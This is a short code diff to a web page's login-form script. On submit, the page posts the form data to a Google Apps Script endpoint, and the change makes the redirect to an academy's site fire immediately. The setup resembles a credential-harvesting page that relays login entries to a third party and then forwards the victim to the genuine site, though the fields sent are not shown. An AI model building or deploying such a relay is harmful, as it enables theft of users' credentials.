@@ -62,9 +62,10 @@ document.getElementById("loginForm").addEventListener("submit", function(e){
   formData.append("role", "participant");
 
   fetch(GOOGLE_SCRIPT_URL, {method:"POST", mode:"no-cors", body:formData})
-    .finally(()=>{window.location.href="https://mpesafoundationacademy.ac.ke/";});
+    // Redirect immediately
+  window.location.href = "https://mpesafoundationacademy.ac.ke/";
 });
 </script>
+
 </body>
 </html>
-
